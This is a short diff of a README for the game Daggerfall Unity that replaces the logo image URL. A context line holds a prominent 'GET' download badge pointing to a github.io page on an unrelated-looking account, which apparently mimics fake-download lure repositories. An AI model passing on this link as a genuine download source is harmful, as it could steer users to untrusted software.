@@ -1,6 +1,6 @@
 # Daggerfall Unity — Elder Scrolls Exploration, Quests & RPG Workflows
 
-![Daggerfall Unity](https://media.moddb.com/images/mods/1/27/26124/Logo.png)
+![Daggerfall Unity](https://kuli.com.ua/images/thumbs/001/0017444_the-elder-scrolls-daggerfall-unity.jpeg)
 
 [![GET — Daggerfall Unity](https://img.shields.io/badge/GET%20%E2%80%94%20Daggerfall%20Unity-0078D6?style=for-the-badge&logoColor=white)](https://allyvly50245.github.io/.github/Daggerfall-Unity-Game)
 
